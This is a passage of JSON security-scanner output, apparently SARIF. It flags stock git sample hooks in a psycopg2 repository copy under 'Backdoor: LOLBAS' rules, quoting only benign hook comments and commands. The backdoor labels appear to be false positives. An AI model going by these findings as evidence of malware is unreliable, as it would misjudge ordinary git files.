                      "markdown": "`validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 69,
                  "endLine": 11,
                  "endColumn": 74,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 45,
                  "endLine": 13,
                  "endColumn": 53,
                  "snippet": {
                    "text": "#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n",
                    "rendered": {
                      "text": "#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n",
                      "markdown": "`#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 51,
                  "endLine": 12,
                  "endColumn": 59,
                  "snippet": {
                    "text": "# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n",
                    "rendered": {
                      "text": "# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n",
                      "markdown": "`# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 53,
                  "endLine": 11,
                  "endColumn": 61,
                  "snippet": {
                    "text": "# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n",
                    "rendered": {
                      "text": "# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n",
                      "markdown": "`# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 15,
                  "endLine": 143,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n",
                    "rendered": {
                      "text": "\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n",
                      "markdown": "`\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 141,
                  "startColumn": 49,
                  "endLine": 141,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n",
                    "rendered": {
                      "text": "\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n",
                      "markdown": "`\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 30,
                  "endLine": 129,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n",
                    "rendered": {
                      "text": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n",
                      "markdown": "`\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 128,
                  "startColumn": 28,
                  "endLine": 128,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n",
                    "rendered": {
                      "text": "\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n",
                      "markdown": "`\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 30,
                  "endLine": 110,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n",
                    "rendered": {
                      "text": "\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n",
                      "markdown": "`\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 45,
                  "endLine": 8,
                  "endColumn": 50,
                  "snippet": {
                    "text": "use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n",
                    "rendered": {
                      "text": "use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n",
                      "markdown": "`use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 17,
                  "endLine": 7,
                  "endColumn": 25,
                  "snippet": {
                    "text": "use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n",
                    "rendered": {
                      "text": "use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n",
                      "markdown": "`use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 1,
                  "endLine": 38,
                  "endColumn": 6,
                  "snippet": {
                    "text": "# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n",
                    "rendered": {
                      "text": "# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n",
                      "markdown": "`# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 37,
                  "endLine": 37,
                  "endColumn": 42,
                  "snippet": {
                    "text": "#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n",
                    "rendered": {
                      "text": "#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n",
                      "markdown": "`#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 25,
                  "endLine": 32,
                  "endColumn": 31,
                  "snippet": {
                    "text": "# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n",
                    "rendered": {
                      "text": "# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n",
                      "markdown": "`# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 40,
                  "endLine": 15,
                  "endColumn": 46,
                  "snippet": {
                    "text": "# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n",
                    "rendered": {
                      "text": "# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n",
                      "markdown": "`# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 4,
                  "endLine": 39,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n",
                    "rendered": {
                      "text": "\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n",
                      "markdown": "`\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 18,
                  "endLine": 5,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n",
                    "rendered": {
                      "text": "\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n",
                      "markdown": "`\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/applypatch-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
